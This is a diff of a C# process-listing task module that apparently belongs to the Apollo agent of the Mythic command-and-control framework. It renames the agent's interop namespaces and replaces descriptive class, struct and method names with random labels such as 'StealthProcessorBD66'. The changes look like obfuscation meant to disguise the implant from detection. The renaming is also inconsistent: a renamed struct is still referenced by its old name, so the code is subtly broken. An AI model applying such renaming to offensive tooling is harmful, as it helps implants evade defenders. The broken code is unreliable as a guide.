@@ -7,23 +7,23 @@
 #if PS
 
 using System;
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System.Threading;
 using TT = System.Threading.Tasks;
 using System.Runtime.InteropServices;
 using System.Management;
-using static ApolloInterop.Enums.Win32;
+using static PhantomInterop.Enums.Win32;
 using System.Security.Principal;
-using ApolloInterop.Classes.Api;
-using ApolloInterop.Classes.Collections;
-using ApolloInterop.Utils;
+using PhantomInterop.Classes.Api;
+using PhantomInterop.Classes.Collections;
+using PhantomInterop.Utils;
 using System.Net.Http;
 
 namespace Tasks
 {
-    public class ps : Tasking
+    public class NexusProcessor6E31 : Tasking
     {
         #region delegates
         private delegate bool OpenProcessToken(
@@ -116,7 +116,7 @@ namespace Tasks
 
         #region helpers
         [StructLayout(LayoutKind.Sequential, Pack = 1)]
-        internal struct ProcessBasicInformation
+        internal struct FlexibleManager0A99
         {
             internal IntPtr ExitStatus;
             internal IntPtr PebBaseAddress;
@@ -128,7 +128,7 @@ namespace Tasks
         public const UInt32 TOKEN_QUERY = 0x0008;
 
         [StructLayout(LayoutKind.Sequential)]
-        internal struct TokenMandatoryLevel
+        internal struct OptimizedServiceE260
         {
 
             public SidAndAttributes Label;
@@ -136,13 +136,13 @@ namespace Tasks
         }
 
         [StructLayout(LayoutKind.Sequential)]
-        internal struct SidAndAttributes
+        internal struct FlexibleBridgeD9D8
         {
             public IntPtr Sid;
             public int Attributes;
         }
 
-        public string GetProcessUser(IntPtr procHandle)
+        public string PhantomDispatcher10FF(IntPtr procHandle)
         {
             try
             {
@@ -159,7 +159,7 @@ namespace Tasks
             }
         }
 
-        public int GetParentProcess(IntPtr procHandle)
+        public int StealthProcessorBD66(IntPtr procHandle)
         {
             try
             {
@@ -178,7 +178,7 @@ namespace Tasks
             }
         }
 
-        private string GetProcessCommandLine(int processId)
+        private string CipherEngineC821(int processId)
         {
             string result = "";
             try
@@ -203,7 +203,7 @@ String.Format("SELECT CommandLine FROM Win32_Process WHERE ProcessId = {0}", pro
             return result;
         }
 
-        private int GetIntegerIntegrityLevel(string il)
+        private int CipherCoordinator31A0(string il)
         {
             int result = 0;
             switch (il)
@@ -235,7 +235,7 @@ String.Format("SELECT CommandLine FROM Win32_Process WHERE ProcessId = {0}", pro
             return result;
         }
 
-        private string GetIntegrityLevel(IntPtr procHandle)
+        private string RobustExecutorF28A(IntPtr procHandle)
         {
             // Returns all SIDs that the current user is a part of, whether they are disabled or not.
             // slightly adapted from https://stackoverflow.com/questions/2146153/how-to-get-the-logon-sid-in-c-sharp/2146418#2146418
